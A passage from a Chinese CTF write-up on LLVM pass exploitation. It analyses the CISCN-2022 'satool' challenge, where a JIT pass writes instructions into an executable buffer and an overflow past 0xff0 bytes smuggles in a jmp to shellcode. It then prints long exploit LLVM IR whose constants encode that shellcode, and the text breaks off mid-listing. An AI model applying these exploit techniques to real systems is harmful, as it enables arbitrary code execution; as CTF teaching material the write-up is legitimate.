winmt093(0);\n    winmt094(0);\n    winmt095(0);\n    winmt096(0);\n    winmt097(0);\n    winmt098(0);\n    winmt099(0);\n    winmt100(0);\n    winmt101(0);\n    winmt102(0);\n    winmt103(0);\n    winmt104(0);\n    winmt105(0);\n    winmt106(0);\n    winmt107(0);\n    winmt108(0);\n    winmt109(0);\n    winmt110(0);\n    winmt111(0);\n    winmt112(0);\n    winmt113(0);\n    winmt114(0);\n    winmt115(0);\n    winmt116(0);\n    winmt117(0);\n    winmt118(0);\n    winmt119(0);\n    winmt120(0);\n    winmt121(0);\n    winmt122(0);\n    winmt123(0);\n    winmt124(0);\n    winmt125(0);\n    winmt126(0);\n    winmt127(0);\n    winmt128(0);\n    winmt129(0);\n    winmt130(0);\n    winmt131(0);\n    winmt132(0);\n    winmt133(0);\n    winmt134(0);\n    winmt135(0);\n    winmt136(0);\n    winmt137(0);\n    winmt138(0);\n    winmt139(0);\n    winmt140(0);\n    winmt141(0);\n    winmt142(0);\n    winmt143(0);\n    winmt144(0);\n    winmt145(0);\n    winmt146(0);\n    winmt147(0);\n    winmt148(0);\n    winmt149(0);\n    winmt150(0);\n    winmt151(0);\n    winmt152(0);\n    winmt153(0);\n    winmt154(0);\n    winmt155(0);\n    winmt156(0);\n    winmt157(0);\n    winmt158(0);\n    winmt159(0);\n    winmt160(0);\n    winmt161(0);\n    winmt162(0);\n    winmt163(0);\n    winmt164(0);\n    winmt165(0);\n    winmt166(0);\n    winmt167(0);\n    winmt168(0);\n    winmt169(0);\n    winmt170(0);\n    winmt171(0);\n    winmt172(0);\n    winmt173(0);\n    winmt174(0);\n    winmt175(0);\n    winmt176(0);\n    winmt177(0);\n    winmt178(0);\n    winmt179(0);\n    winmt180(0);\n    winmt181(0);\n    winmt182(0);\n    winmt183(0);\n    winmt184(0);\n    winmt185(0);\n    winmt186(0);\n    winmt187(0);\n    winmt188(0);\n    winmt189(0);\n    winmt190(0);\n    winmt191(0);\n    winmt192(0);\n    winmt193(0);\n    winmt194(0);\n    winmt195(0);\n    winmt196(0);\n    winmt197(0);\n    winmt198(0);\n    winmt199(0);\n    winmt200(0);\n    winmt201(0);\n    winmt202(0);\n    winmt203(0);\n    winmt204(0);\n    winmt205(0);\n    winmt206(0);\n    winmt207(0);\n    winmt208(0);\n    winmt209(0);\n    winmt210(0);\n    winmt211(0);\n    winmt212(0);\n    winmt213(0);\n    winmt214(0);\n    winmt215(0);\n    winmt216(0);\n    winmt217(0);\n    winmt218(0);\n    winmt219(0);\n    winmt220(0);\n    winmt221(0);\n    winmt222(0);\n    winmt223(0);\n    winmt224(0);\n    winmt225(0);\n    winmt226(0);\n    winmt227(0);\n    winmt228(0);\n    winmt229(0);\n    winmt230(0);\n    winmt231(0);\n    winmt232(0x6B);\n    winmt233(0x69);\n    winmt234(0x44);\n    winmt235(0x00);\n    winmt236(0);\n    winmt237(0);\n    winmt238(0);\n    winmt239(0);\n    winmt240(0x90);\n \n    winmt240(0x90);\n    winmt232(0x6B);\n    winmt233(0x69);\n    winmt234(0x44);\n    winmt235(0x00);\n \n    fight(0);\n}\n```\n\n\n\n## CISCN-2022 satool\n\n### 漏洞分析\n\n常见的找到处理函数`runOnFunction`和注册名`mba`，函数名称没有限定，任意函数都可以。\n\n![image-20230831092827452](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831092827452.png)\n\n首先是给`this[4]`可写可执行权限，然后进入`handle`对其进行操作\n\n![image-20230831094134640](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094134640.png)\n\n#### handle函数\n\n在`handle`里面针对基本块的操作数的属性(常量/函数参数/本地变量)，来调用对应的函数对`this`进行修改\n\n![image-20230831094203070](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094203070.png)\n\n- `arg0`为常量：\n\n  `this[12]`赋值为0\n\n  - `writeMovImm64(this, 0, SExtValue)`：\n\n    ![image-20230831094355406](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094355406.png)\n\n    写入`this[5]`指针对应内容为`\\x48\\xB8 + a3`，这个`a3`即为基本块的操作数 ，随后`this[5]`对应指针+10，相当于一次修改10个字节，对应汇编语句为\n\n    ![image-20230831140633173](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140633173.png)\n\n  - `write(this)`：\n\n    ![image-20230831094815416](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094815416.png)\n\n    写入`this[5]`指针对应内容为`\\xc3`，对应汇编为`ret`\n\n    总的来说就是写入`(\\x48\\xB8 + a3)`再写入`\\xc3`\n\n- `arg0`为函数参数：\n\n  ![image-20230831140800260](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140800260.png)\n\n  `this[12]`赋值为1，通过上述分析可知，写入`this[5]`的数据为`(\\x48\\xB8\\x00).ljust(10,'\\x00') + \\xc3`，对应汇编为\n\n  ![image-20230831140826181](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140826181.png)\n\n- `arg0`为本地变量：\n\n  ![image-20230831141053247](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141053247.png)\n\n  首先是写入`movavs rax,0`，然后`this[12]`赋值为0，`stackLLvmValueVar`压入操作符，`stackIntVar`压入1，进入循环，直到写入`0xff0`字节后跳出循环\n\n  - `while`循环\n\n    经过一些判断，代表只对操作符为`\\xd`和`\\xf`的进行操作，查`LLVM`定义的表为`add`和`sub`指令有效。\n\n    ![image-20230831141354185](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141354185.png)\n\n    - `arg0`为常量，且为1或-1时，调用`writeInc`函数\n\n      ![image-20230831141929747](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141929747.png)`stackIntVar_top*arg0`为1时，写入`inc rax`![image-20230831142327635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png)`stackIntVar_top*arg0`不为1时，写入`dec rax`![image-20230831142406119](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png)\n\n      `arg0`为常量不为1或-1时，调用`writeMovImm64`函数，写入`\\x48\\xbb + arg0*stackIntVar_top `\n\n      ![image-20230831142605020](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png)\n\n      调用`writeOpReg`函数，写入`\\x48\\x01\\xd8`，即为`add rax,rbx`\n\n      ![image-20230831143318448](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png)\n\n    - `arg0`为函数参数时，`this[12]`赋值为`stackIntVar_top`\n\n      ![image-20230831143424721](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143424721.png)\n\n    - `arg0`为变量时，将`arg0`放`入stackLLvmValueVar`，`stackIntVar_top`放入`stackIntVar`\n\n      ![image-20230831143518100](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143518100.png)\n\n    - 指令为`sub`时，`stackIntVar_top = -stackIntVar_top`\n\n      ![image-20230831143830853](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143830853.png)\n\n    - `arg1`为常量时，且为1或-1时，调用`writeInc`函数\n\n      ![image-20230831144224528](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144224528.png)\n\n      `stackIntVar_top`为1时，写入`inc rax`![image-20230831142327635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png)`stackIntVar_top`不为1时，写入`dec rax`![image-20230831142406119](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png)\n\n      `arg0`为常量不为1或-1时，调用`writeMovImm64`函数，写入`\\x48\\xbb + arg0*stackIntVar_top `\n\n      ![image-20230831142605020](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png)\n\n      调用`writeOpReg`函数，写入`\\x48\\x01\\xd8`，即为`add rax,rbx`\n\n      ![image-20230831143318448](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png)\n\n    - `arg1`为函数参数时，`this[12]`赋值为`stackIntVar_top`\n\n      ![image-20230831144329204](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144329204.png)\n\n    - `arg1`为本地变量时 ，将`arg1`放`入stackLLvmValueVar`，`stackIntVar_top`放入`stackIntVar`\n\n      ![image-20230831144410252](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144410252.png)\n\n  - 跳出`while`循环后对栈进行析构操作\n\n#### 执行指令\n\n退出`handle`函数后，会赋予`this[4]`可读可执行的权限，并且进入`callCode`进行执行。\n\n![image-20230831145139588](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145139588.png)\n\n这里注意一下`this[4]`和`this[5]`最开始存放的是同一个指针，所以我们写入的地方就是`this[4]`存放的指针位置处。\n\n![image-20230831145218292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145218292.png)\n\n漏洞点发生在整体的逻辑上，调试可知，最开始的`this[4]`是本身完全被初始化为`ret`指令，并且长度超过`0xff0`，那么当通过`while`循环写入超过`0xff0`长度的指令时\n\n![image-20230831150630034](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831150630034.png)\n\n那么无论最后有没有被写入`ret`再退出循环，都会存在`ret`指令，从而安全退出，执行到下一个函数进行解析。这样就可以在第一个函数中超出`0xff0`长度写入`jmp`指令，使用形如`add var,con`形式如下\n\n```\n0xff0 mov raxabs,xx\n0xff8 add rax,rbx\n0xffb mov raxabx,yyyy\n0x1000 ret\n```\n\n其中`yyyy`数据的`0xffe`地址开始处就包含`jmp`指令\n\n第二个函数中写入\n\n```\n0xff0 mov raxabs,xx\n0xff8 add rax,rbx\n0xffb dec rax\n```\n\n这样总的就是\n\n```\n0xff0 mov raxabs,xx\n0xff8 add rax,rbx\n0xffb dec rax\n0xffe jmp xxx\n0x1000 ret\n```\n\n顺利绕过末尾补`ret`进入`jmp`跳转。\n\n随后通过之前的`mov raxabs,xxxx`中的`xxxx`八个字节，完成赋值加连环跳转的工作，从而执行真正的`shellcode`\n\n### 漏洞利用\n\n就直接用`winmt`师傅的`exp`了\n\n[[原创\\] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9)\n\n需要注意的是，由于使用的只能是`add/sub`指令，所以需要通过空函数的`exp.c`生成`exp.ll`，然后再在里面补充对应的`add`指令即可\n\n```c\n; ModuleID = 'exp.c'\nsource_filename = \"exp.c\"\ntarget datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\"\ntarget triple = \"x86_64-pc-linux-gnu\"\n \n; Function Attrs: noinline nounwind optnone uwtable\ndefine dso_local i64 @payload1(i64 %0) #0 {\n  %2 = add nsw i64 %0, 58603\n  %3 = add nsw i64 %2, 1024\n  %4 = add nsw i64 %3, 1024\n  %5 = add nsw i64 %4, 1024\n  %6 = add nsw i64 %5, 1024\n  %7 = add nsw i64 %6, 1024\n  %8 = add nsw i64 %7, 1024\n  %9 = add nsw i64 %8, 1024\n  %10 = add nsw i64 %9, 1024\n  %11 = add nsw i64 %10, 1024\n  %12 = add nsw i64 %11, 1024\n  %13 = add nsw i64 %12, 1024\n  %14 = add nsw i64 %13, 1024\n  %15 = add nsw i64 %14, 1024\n  %16 = add nsw i64 %15, 1024\n  %17 = add nsw i64 %16, 1024\n  %18 = add nsw i64 %17, 1024\n  %19 = add nsw i64 %18, 1024\n  %20 = add nsw i64 %19, 1024\n  %21 = add nsw i64 %20, 1024\n  %22 = add nsw i64 %21, 1024\n  %23 = add nsw i64 %22, 1024\n  %24 = add nsw i64 %23, 1024\n  %25 = add nsw i64 %24, 1024\n  %26 = add nsw i64 %25, 1024\n  %27 = add nsw i64 %26, 1024\n  %28 = add nsw i64 %27, 1024\n  %29 = add nsw i64 %28, 1024\n  %30 = add nsw i64 %29, 1024\n  %31 = add nsw i64 %30, 1024\n  %32 = add nsw i64 %31, 1024\n  %33 = add nsw i64 %32, 1024\n  %34 = add nsw i64 %33, 1024\n  %35 = add nsw i64 %34, 1024\n  %36 = add nsw i64 %35, 1024\n  %37 = add nsw i64 %36, 1024\n  %38 = add nsw i64 %37, 1024\n  %39 = add nsw i64 %38, 1024\n  %40 = add nsw i64 %39, 1024\n  %41 = add nsw i64 %40, 1024\n  %42 = add nsw i64 %41, 1024\n  %43 = add nsw i64 %42, 1024\n  %44 = add nsw i64 %43, 1024\n  %45 = add nsw i64 %44, 1024\n  %46 = add nsw i64 %45, 1024\n  %47 = add nsw i64 %46, 1024\n  %48 = add nsw i64 %47, 1024\n  %49 = add nsw i64 %48, 1024\n  %50 = add nsw i64 %49, 1024\n  %51 = add nsw i64 %50, 1024\n  %52 = add nsw i64 %51, 1024\n  %53 = add nsw i64 %52, 1024\n  %54 = add nsw i64 %53, 1024\n  %55 = add nsw i64 %54, 1024\n  %56 = add nsw i64 %55, 1024\n  %57 = add nsw i64 %56, 1024\n  %58 = add nsw i64 %57, 1024\n  %59 = add nsw i64 %58, 1024\n  %60 = add nsw i64 %59, 1024\n  %61 = add nsw i64 %60, 1024\n  %62 = add nsw i64 %61, 1024\n  %63 = add nsw i64 %62, 1024\n  %64 = add nsw i64 %63, 1024\n  %65 = add nsw i64 %64, 1024\n  %66 = add nsw i64 %65, 1024\n  %67 = add nsw i64 %66, 1024\n  %68 = add nsw i64 %67, 1024\n  %69 = add nsw i64 %68, 1024\n  %70 = add nsw i64 %69, 1024\n  %71 = add nsw i64 %70, 1024\n  %72 = add nsw i64 %71, 1024\n  %73 = add nsw i64 %72, 1024\n  %74 = add nsw i64 %73, 1024\n  %75 = add nsw i64 %74, 1024\n  %76 = add nsw i64 %75, 1024\n  %77 = add nsw i64 %76, 1024\n  %78 = add nsw i64 %77, 1024\n  %79 = add nsw i64 %78, 1024\n  %80 = add nsw i64 %79, 1024\n  %81 = add nsw i64 %80, 1024\n  %82 = add nsw i64 %81, 1024\n  %83 = add nsw i64 %82, 1024\n  %84 = add nsw i64 %83, 1024\n  %85 = add nsw i64 %84, 1024\n  %86 = add nsw i64 %85, 1024\n  %87 = add nsw i64 %86, 1024\n  %88 = add nsw i64 %87, 1024\n  %89 = add nsw i64 %88, 1024\n  %90 = add nsw i64 %89, 1024\n  %91 = add nsw i64 %90, 1024\n  %92 = add nsw i64 %91, 1024\n  %93 = add nsw i64 %92, 1024\n  %94 = add nsw i64 %93, 1024\n  %95 = add nsw i64 %94, 1024\n  %96 = add nsw i64 %95, 1024\n  %97 = add nsw i64 %96, 1024\n  %98 = add nsw i64 %97, 1024\n  %99 = add nsw i64 %98, 1024\n  %100 = add nsw i64 %99, 1024\n  %101 = add nsw i64 %100, 1024\n  %102 = add nsw i64 %101, 1024\n  %103 = add nsw i64 %102, 1024\n  %104 = add nsw i64 %103, 1024\n  %105 = add nsw i64 %104, 1024\n  %106 = add nsw i64 %105, 1024\n  %107 = add nsw i64 %106, 1024\n  %108 = add nsw i64 %107, 1024\n  %109 = add nsw i64 %108, 1024\n  %110 = add nsw i64 %109, 1024\n  %111 = add nsw i64 %110, 1024\n  %112 = add nsw i64 %111, 1024\n  %113 = add nsw i64 %112, 1024\n  %114 = add nsw i64 %113, 1024\n  %115 = add nsw i64 %114, 1024\n  %116 = add nsw i64 %115, 1024\n  %117 = add nsw i64 %116, 1024\n  %118 = add nsw i64 %117, 1024\n  %119 = add nsw i64 %118, 1024\n  %120 = add nsw i64 %119, 1024\n  %121 = add nsw i64 %120, 1024\n  %122 = add nsw i64 %121, 1024\n  %123 = add nsw i64 %122, 1024\n  %124 = add nsw i64 %123, 1024\n  %125 = add nsw i64 %124, 1024\n  %126 = add nsw i64 %125, 1024\n  %127 = add nsw i64 %126, 1024\n  %128 = add nsw i64 %127, 1024\n  %129 = add nsw i64 %128, 1024\n  %130 = add nsw i64 %129, 1024\n  %131 = add nsw i64 %130, 1024\n  %132 = add nsw i64 %131, 1024\n  %133 = add nsw i64 %132, 1024\n  %134 = add nsw i64 %133, 1024\n  %135 = add nsw i64 %134, 1024\n  %136 = add nsw i64 %135, 1024\n  %137 = add nsw i64 %136, 1024\n  %138 = add nsw i64 %137, 1024\n  %139 = add nsw i64 %138, 1024\n  %140 = add nsw i64 %139, 1024\n  %141 = add nsw i64 %140, 1024\n  %142 = add nsw i64 %141, 1024\n  %143 = add nsw i64 %142, 1024\n  %144 = add nsw i64 %143, 1024\n  %145 = add nsw i64 %144, 1024\n  %146 = add nsw i64 %145, 1024\n  %147 = add nsw i64 %146, 1024\n  %148 = add nsw i64 %147, 1024\n  %149 = add nsw i64 %148, 1024\n  %150 = add nsw i64 %149, 1024\n  %151 = add nsw i64 %150, 1024\n  %152 = add nsw i64 %151, 1024\n  %153 = add nsw i64 %152, 1024\n  %154 = add nsw i64 %153, 1024\n  %155 = add nsw i64 %154, 1024\n  %156 = add nsw i64 %155, 1024\n  %157 = add nsw i64 %156, 1024\n  %158 = add nsw i64 %157, 1024\n  %159 = add nsw i64 %158, 1024\n  %160 = add nsw i64 %159, 1024\n  %161 = add nsw i64 %160, 1024\n  %162 = add nsw i64 %161, 1024\n  %163 = add nsw i64 %162, 1024\n  %164 = add nsw i64 %163, 1024\n  %165 = add nsw i64 %164, 1024\n  %166 = add nsw i64 %165, 1024\n  %167 = add nsw i64 %166, 1024\n  %168 = add nsw i64 %167, 1024\n  %169 = add nsw i64 %168, 1024\n  %170 = add nsw i64 %169, 1024\n  %171 = add nsw i64 %170, 1024\n  %172 = add nsw i64 %171, 1024\n  %173 = add nsw i64 %172, 1024\n  %174 = add nsw i64 %173, 1024\n  %175 = add nsw i64 %174, 1024\n  %176 = add nsw i64 %175, 1024\n  %177 = add nsw i64 %176, 1024\n  %178 = add nsw i64 %177, 1024\n  %179 = add nsw i64 %178, 1024\n  %180 = add nsw i64 %179, 1024\n  %181 = add nsw i64 %180, 1024\n  %182 = add nsw i64 %181, 1024\n  %183 = add nsw i64 %182, 1024\n  %184 = add nsw i64 %183, 1024\n  %185 = add nsw i64 %184, 1024\n  %186 = add nsw i64 %185, 1024\n  %187 = add nsw i64 %186, 1024\n  %188 = add nsw i64 %187, 1024\n  %189 = add nsw i64 %188, 1024\n  %190 = add nsw i64 %189, 1024\n  %191 = add nsw i64 %190, 1024\n  %192 = add nsw i64 %191, 1024\n  %193 = add nsw i64 %192, 1024\n  %194 = add nsw i64 %193, 1024\n  %195 = add nsw i64 %194, 1024\n  %196 = add nsw i64 %195, 1024\n  %197 = add nsw i64 %196, 1024\n  %198 = add nsw i64 %197, 1024\n  %199 = add nsw i64 %198, 1024\n  %200 = add nsw i64 %199, 1024\n  %201 = add nsw i64 %200, 1024\n  %202 = add nsw i64 %201, 1024\n  %203 = add nsw i64 %202, 1024\n  %204 = add nsw i64 %203, 1024\n  %205 = add nsw i64 %204, 1024\n  %206 = add nsw i64 %205, 1024\n  %207 = add nsw i64 %206, 1024\n  %208 = add nsw i64 %207, 1024\n  %209 = add nsw i64 %208, 1024\n  %210 = add nsw i64 %209, 1024\n  %211 = add nsw i64 %210, 1024\n  %212 = add nsw i64 %211, 1024\n  %213 = add nsw i64 %212, 1024\n  %214 = add nsw i64 %213, 1024\n  %215 = add nsw i64 %214, 1024\n  %216 = add nsw i64 %215, 1024\n  %217 = add nsw i64 %216, 1024\n  %218 = add nsw i64 %217, 1024\n  %219 = add nsw i64 %218, 1024\n  %220 = add nsw i64 %219, 1024\n  %221 = add nsw i64 %220, 1024\n  %222 = add nsw i64 %221, 1024\n  %223 = add nsw i64 %222, 1024\n  %224 = add nsw i64 %223, 1024\n  %225 = add nsw i64 %224, 1024\n  %226 = add nsw i64 %225, 1024\n  %227 = add nsw i64 %226, 1024\n  %228 = add nsw i64 %227, 1024\n  %229 = add nsw i64 %228, 1024\n  %230 = add nsw i64 %229, 1024\n  %231 = add nsw i64 %230, 1024\n  %232 = add nsw i64 %231, 1024\n  %233 = add nsw i64 %232, 1024\n  %234 = add nsw i64 %233, 1024\n  %235 = add nsw i64 %234, 1024\n  %236 = add nsw i64 %235, 1024\n  %237 = add nsw i64 %236, 1024\n  %238 = add nsw i64 %237, 1024\n  %239 = add nsw i64 %238, 1024\n  %240 = add nsw i64 %239, 1024\n  %241 = add nsw i64 %240, 1024\n  %242 = add nsw i64 %241, 1024\n  %243 = add nsw i64 %242, 1024\n  %244 = add nsw i64 %243, 1024\n  %245 = add nsw i64 %244, 1024\n  %246 = add nsw i64 %245, 1024\n  %247 = add nsw i64 %246, 1024\n  %248 = add nsw i64 %247, 1024\n  %249 = add nsw i64 %248, 1024\n  %250 = add nsw i64 %249, 1024\n  %251 = add nsw i64 %250, 1024\n  %252 = add nsw i64 %251, 1024\n  %253 = add nsw i64 %252, 1024\n  %254 = add nsw i64 %253, 1024\n  %255 = add nsw i64 %254, 1024\n  %256 = add nsw i64 %255, 1024\n  %257 = add nsw i64 %256, 1024\n  %258 = add nsw i64 %257, 1024\n  %259 = add nsw i64 %258, 1024\n  %260 = add nsw i64 %259, 1024\n  %261 = add nsw i64 %260, 1024\n  %262 = add nsw i64 %261, 1024\n  %263 = add nsw i64 %262, 1024\n  %264 = add nsw i64 %263, 1024\n  %265 = add nsw i64 %264, 1024\n  %266 = add nsw i64 %265, 1024\n  %267 = add nsw i64 %266, 1024\n  %268 = add nsw i64 %267, 1024\n  %269 = add nsw i64 %268, 1024\n  %270 = add nsw i64 %269, 1024\n  %271 = add nsw i64 %270, 1024\n  %272 = add nsw i64 %271, 1024\n  %273 = add nsw i64 %272, 1024\n  %274 = add nsw i64 %273, 1024\n  %275 = add nsw i64 %274, 1024\n  %276 = add nsw i64 %275, 1024\n  %277 = add nsw i64 %276, 1024\n  %278 = add nsw i64 %277, 1024\n  %279 = add nsw i64 %278, 1024\n  %280 = add nsw i64 %279, 1024\n  %281 = add nsw i64 %280, 1024\n  %282 = add nsw i64 %281, 1024\n  %283 = add nsw i64 %282, 1024\n  %284 = add nsw i64 %283, 1024\n  %285 = add nsw i64 %284, 1024\n  %286 = add nsw i64 %285, 1024\n  %287 = add nsw i64 %286, 1024\n  %288 = add nsw i64 %287, 1024\n  %289 = add nsw i64 %288, 1024\n  %290 = add nsw i64 %289, 1024\n  %291 = add nsw i64 %290, 1024\n  %292 = add nsw i64 %291, 1024\n  %293 = add nsw i64 %292, 1024\n  %294 = add nsw i64 %293, 1024\n  %295 = add nsw i64 %294, 1024\n  %296 = add nsw i64 %295, 1024\n  %297 = add nsw i64 %296, 1024\n  %298 = add nsw i64 %297, 1024\n  %299 = add nsw i64 %298, 1024\n  %300 = add nsw i64 %299, 1024\n  %301 = add nsw i64 %300, 1024\n  %302 = add nsw i64 %301, 1024\n  %303 = add nsw i64 %302, 1024\n  %304 = add nsw i64 %303, 1024\n  %305 = add nsw i64 %304, 1024\n  %306 = add nsw i64 %305, 1024\n  %307 = add nsw i64 %306, 1024\n  %308 = add nsw i64 %307, 1024\n  %309 = add nsw i64 %308, 1024\n  %310 = add nsw i64 %309, 1024\n  %311 = add nsw i64 %310, 1024\n  %312 = add nsw i64 %311, 1024\n  %313 = add nsw i64 %312, 1024\n  %314 = add nsw i64 %313, 1024\n  %315 = add nsw i64 %314, 1024\n  ret i64 %315\n}\n \n; Function Attrs: noinline nounwind optnone uwtable\ndefine dso_local i64 @payload2(i64 %0) #0 {\n  %2 = add nsw i64 %0, 1\n  %3 = add nsw i64 %2, 1\n  %4 = add nsw i64 %3, 1\n  %5 = add nsw i64 %4, 1\n  %6 = add nsw i64 %5, 1\n  %7 = add nsw i64 %6, 16999839996723556031\n  %8 = add nsw i64 %7, 16999840167007600968\n  %9 = add nsw i64 %8, 16999839549882511291\n  %10 = add nsw i64 %9, 16999840169020293448\n  %11 = add nsw i64 %10, 16999840169015152727\n  %12 = add nsw i64 %11, 16999840169015152724\n  %13 = add nsw i64 %12, 16999840169015152735\n  %14 = add nsw i64 %13, 16999840169021813064\n  %15 = add nsw i64 %14, 16999840169019453768\n  %16 = add nsw i64 %15, 16999840169015130986\n  %17 = add nsw i64 %16, 16999840169015152728\n  %18 = add nsw i64 %17, 16999840169015117071\n  %19 = add nsw i64 %18, 1024\n  %20 = add nsw i64 %19, 1024\n  %21 = add nsw i64 %20, 1024\n  %22 = add nsw i64 %21, 1024\n  %23 = add nsw i64 %22, 1024\n  %24 = add nsw i64 %23, 1024\n  %25 = add nsw i64 %24, 1024\n  %26 = add nsw i64 %25, 1024\n  %27 = add nsw i64 %26, 1024\n  %28 = add nsw i64 %27, 1024\n  %29 = add nsw i64 %28, 1024\n  %30 = add nsw i64 %29, 1024\n  %31 = add nsw i64 %30, 1024\n  %32 = add nsw i64 %31, 1024\n  %33 = add nsw i64 %32, 1024\n  %34 = add nsw i64 %33, 1024\n  %35 = add nsw i64 %34, 1024\n  %36 = add nsw i64 %35, 1024\n  %37 = add nsw i64 %36, 1024\n  %38 = add nsw i64 %37, 1024\n  %39 = add nsw i64 %38, 1024\n  %40 = add nsw i64 %39, 1024\n  %41 = add nsw i64 %40, 1024\n  %42 = add nsw i64 %41, 1024\n  %43 = add nsw i64 %42, 1024\n  %44 = add nsw i64 %43, 1024\n  %45 = add nsw i64 %44, 1024\n  %46 = add nsw i64 %45, 1024\n  %47 = add nsw i64 %46, 1024\n  %48 = add nsw i64 %47, 1024\n  %49 = add nsw i64 %48, 1024\n  %50 = add nsw i64 %49, 1024\n  %51 = add nsw i64 %50, 1024\n  %52 = add nsw i64 %51, 1024\n  %53 = add nsw i64 %52, 1024\n  %54 = add nsw i64 %53, 1024\n  %55 = add nsw i64 %54, 1024\n  %56 = add nsw i64 %55, 1024\n  %57 = add nsw i64 %56, 1024\n  %58 = add nsw i64 %57, 1024\n  %59 = add nsw i64 %58, 1024\n  %60 = add nsw i64 %59, 1024\n  %61 = add nsw i64 %60, 1024\n  %62 = add nsw i64 %61, 1024\n  %63 = add nsw i64 %62, 1024\n  %64 = add nsw i64 %63, 1024\n  %65 = add nsw i64 %64, 1024\n  %66 = add nsw i64 %65, 1024\n  %67 = add nsw i64 %66, 1024\n  %68 = add nsw i64 %67, 1024\n  %69 = add nsw i64 %68, 1024\n  %70 = add nsw i64 %69, 1024\n  %71 = add nsw i64 %70, 1024\n  %72 = add nsw i64 %71, 1024\n  %73 = add nsw i64 %72, 1024\n  %74 = add nsw i64 %73, 1024\n  %75 = add nsw i64 %74, 1024\n  %76 = add nsw i64 %75, 1024\n  %77 = add nsw i64 %76, 1024\n  %78 = add nsw i64 %77, 1024\n  %79 = add nsw i64 %78, 1024\n  %80 = add nsw i64 %79, 1024\n  %81 = add nsw i64 %80, 1024\n  %82 = add nsw i64 %81, 1024\n  %83 = add nsw i64 %82, 1024\n  %84 = add nsw i64 %83, 1024\n  %85 = add nsw i64 %84, 1024\n  %86 = add nsw i64 %85, 1024\n  %87 = add nsw i64 %86, 1024\n  %88 = add nsw i64 %87, 1024\n  %89 = add nsw i64 %88, 1024\n  %90 = add nsw i64 %89, 1024\n  %91 = add nsw i64 %90, 1024\n  %92 = add nsw i64 %91, 1024\n  %93 = add nsw i64 %92, 1024\n  %94 = add nsw i64 %93, 1024\n  %95 = add nsw i64 %94, 1024\n  %96 = add nsw i64 %95, 1024\n  %97 = add nsw i64 %96, 1024\n  %98 = add nsw i64 %97, 1024\n  %99 = add nsw i64 %98, 1024\n  %100 = add nsw i64 %99, 1024\n  %101 = add nsw i64 %100, 1024\n  %102 = add nsw i64 %101, 1024\n  %103 = add nsw i64 %102, 1024\n  %104 = add nsw i64 %103, 1024\n  %105 = add nsw i64 %104, 1024\n  %106 = add nsw i64 %105, 1024\n  %107 = add nsw i64 %106, 1024\n  %108 = add nsw i64 %107, 1024\n  %109 = add nsw i64 %108, 1024\n  %110 = add nsw i64 %109, 1024\n  %111 = add nsw i64 %110, 1024\n  %112 = add nsw i64 %111, 1024\n  %113 = add nsw i64 %112, 1024\n  %114 = add nsw i64 %113, 1024\n  %115 = add nsw i64 %114, 1024\n  %116 = add nsw i64 %115, 1024\n  %117 = add nsw i64 %116, 1024\n  %118 = add nsw i64 %117, 1024\n  %119 = add nsw i64 %118, 1024\n  %120 = add nsw i64 %119, 1024\n  %121 = add nsw i64 %120, 1024\n  %122 = add nsw i64 %121, 1024\n  %123 = add nsw i64 %122, 1024\n  %124 = add nsw i64 %123, 1024\n  %125 = add nsw i64 %124, 1024\n  %126 = add nsw i64 %125, 1024\n  %127 = add nsw i64 %126, 1024\n  %128 = add nsw i64 %127, 1024\n  %129 = add nsw i64 %128, 1024\n  %130 = add nsw i64 %129, 1024\n  %131 = add nsw i64 %130, 1024\n  %132 = add nsw i64 %131, 1024\n  %133 = add nsw i64 %132, 1024\n  %134 = add nsw i64 %133, 1024\n  %135 = add nsw i64 %134, 1024\n  %136 = add nsw i64 %135, 1024\n  %137 = add nsw i64 %136, 1024\n  %138 = add nsw i64 %137, 1024\n  %139 = add nsw i64 %138, 1024\n  %140 = add nsw i64 %139, 1024\n  %141 = add nsw i64 %140, 1024\n  %142 = add nsw i64 %141, 1024\n  %143 = add nsw i64 %142, 1024\n  %144 = add nsw i64 %143, 1024\n  %145 = add nsw i64 %144, 1024\n  %146 = add nsw i64 %145, 1024\n  %147 = add nsw i64 %146, 1024\n  %148 = add nsw i64 %147, 1024\n  %149 = add nsw i64 %148, 1024\n  %150 = add nsw i64 %149, 1024\n  %151 = add nsw i64 %150, 1024\n  %152 = add nsw i64 %151, 1024\n  %153 = add nsw i64 %152, 1024\n  %154 = add nsw i64 %153, 1024\n  %155 = add nsw i64 %154, 1024\n  %156 = add nsw i64 %155, 1024\n  %157 = add nsw i64 %156, 1024\n  %158 = add nsw i64 %157, 1024\n  %159 = add nsw i64 %158, 1024\n  %160 = add nsw i64 %159, 